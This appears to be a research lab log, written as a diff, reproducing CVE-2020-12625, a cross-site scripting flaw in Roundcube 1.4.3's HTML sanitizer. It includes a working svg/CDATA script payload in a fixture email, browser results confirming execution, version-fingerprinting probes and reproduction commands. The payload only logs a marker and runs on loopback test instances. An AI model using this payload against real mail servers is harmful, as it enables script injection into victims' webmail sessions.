@@ -1,0 +1,92 @@
+# Pilot 3-CVE — Ca C reproduction: CVE-2020-12625 (Roundcube XSS via HTML email)
+# timestamp: 2026-10-07T00:59:51.848635Z
+# Lab: pilot-roundcube-vuln :8085 (1.4.3) / pilot-roundcube-fixed :8086 (1.4.4), VM loopback
+# Access: browser harness reached the instances through an SSH loopback tunnel
+
+## 1. Vector and fixture
+Root cause (diff of program/lib/Roundcube/rcube_washtml.php):
+  1.4.3  XML_CDATA_SECTION_NODE:  $dump .= $node->nodeValue;      # emitted UNESCAPED
+  1.4.4  CDATA case falls through to XML_TEXT_NODE:
+         $dump .= htmlspecialchars($node->nodeValue, ...)        # escaped
+
+Fixture email HTML part (delivered by SMTP to test@localhost):
+  <html><body><p>RQ-C1 benign text</p>
+  <svg><![CDATA[<script>window.__rqC1Xss='EXECUTED';console.log('RQ-C1-XSS-EXECUTED');</script>]]></svg>
+  </body></html>
+The <svg> tag is in the washtml allowlist; <script> is normally an ignored
+element, but it arrives as raw text of a CDATA node and bypasses the filter.
+
+## 2. Browser ground truth (headless Chromium, Playwright)
+-- roundcube-1.4.3 (vuln) :18085 (uid=2) logged_in=True
+   executed = True   via = (console marker)
+   console markers: ['[log] RQ-C1-XSS-EXECUTED @http://127.0.0.1:18085/?_task=mail&_action=show&_uid=2&_mbox=INBOX', '[log] RQ-C1-XSS-EXECUTED @http://127.0.0.1:18085/?_task=mail&_action=show&_uid=2&_mbox=INBOX&_extwin=1', '[log] RQ-C1-XSS-EXECUTED @http://127.0.0.1:18085/?_task=mail&_mbox=INBOX&_uid=2&_action=preview']
+   dialogs: (none)
+   page errors: (none)
+
+-- roundcube-1.4.4 (fixed) :18086 (uid=2) logged_in=True
+   executed = False   via = None
+   console markers: (none)
+   dialogs: (none)
+   page errors: (none)
+
+VERDICT: 1.4.3 -> XSS EXECUTED (script ran in the browser).
+         1.4.4 -> no execution.
+
+## 3. Server-side sanitized output (authenticated fetch of the message body)
+Request: GET /?_task=mail&_action=show&_uid=2&_mbox=INBOX&_extwin=1 (session of test/test)
+-- Roundcube 1.4.3 :18085  bytes=19522
+   raw unescaped <script> marker present : True
+   escaped &lt;script&gt; marker present   : False
+-- Roundcube 1.4.4 :18086  bytes=19534
+   raw unescaped <script> marker present : False
+   escaped &lt;script&gt; marker present   : True
+   context: vg xmlns="http://www.w3.org/1999/xhtml">&lt;script&gt;window.__rqC1Xss='EXECUTED';console.log('RQ-C1-XSS-EXECU
+
+NOTE (evidence separation, per pilot plan): this authenticated fetch is part of
+the reproduction ground truth. The payload/fixture and the browser execution
+result must NOT be given to the fusion method as observation input.
+
+## 4. Unauthenticated observability (method stream, no payload)
+===== Roundcube 1.4.3 (http://127.0.0.1:18085) — UNAUTHENTICATED =====
+  /                                          -> 200  bytes=  5081  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /?_task=login                              -> 200  bytes=  5092  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /CHANGELOG                                 -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /INSTALL                                   -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /README.md                                 -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /composer.json                             -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /LICENSE                                   -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /robots.txt                                -> 404  bytes=   274  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /program/include/iniset.php                -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /skins/elastic/meta.json                   -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /plugins/jqueryui/package.json             -> 404  bytes=   274  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /index.php                                 -> 200  bytes=  5081  Server='Apache/2.4.38 (Debian)'  verhints=-
+
+===== Roundcube 1.4.4 (http://127.0.0.1:18086) — UNAUTHENTICATED =====
+  /                                          -> 200  bytes=  5081  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /?_task=login                              -> 200  bytes=  5092  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /CHANGELOG                                 -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /INSTALL                                   -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /README.md                                 -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /composer.json                             -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /LICENSE                                   -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /robots.txt                                -> 404  bytes=   274  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /program/include/iniset.php                -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /skins/elastic/meta.json                   -> 403  bytes=   277  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /plugins/jqueryui/package.json             -> 404  bytes=   274  Server='Apache/2.4.38 (Debian)'  verhints=-
+  /index.php                                 -> 200  bytes=  5081  Server='Apache/2.4.38 (Debian)'  verhints=-
+
+Result: NO version clue is observable without logging in.
+  * login page + assets carry only a 10-digit cache-buster (?s=1582145757), not a version
+  * /CHANGELOG, /INSTALL, /README.md, /composer.json, /LICENSE, /program/include/iniset.php -> 403
+  * Server header only reveals Apache/2.4.38, not Roundcube
+
+## 5. Artifacts
+  caC-1.4.3.png / caC-1.4.4.png  screenshots
+  msg-1.4.3.html / msg-1.4.4.html  sanitized message HTML
+  caC-result.json  raw harness output (kept on VM + /tmp)
+
+## 6. Reproduction commands
+  VM:  python3 scripts/repro/50-ca-C-send-email.py          # send fixture
+  Win: ssh -L 18085:127.0.0.1:8085 -L 18086:127.0.0.1:8086 <lab-user>@<lab-ip>
+       NODE_ROOT=$(npm root -g) CHROME=<chromium-1208 chrome> MSGUID=2 \
+         node scripts/repro/42-ca-C.js
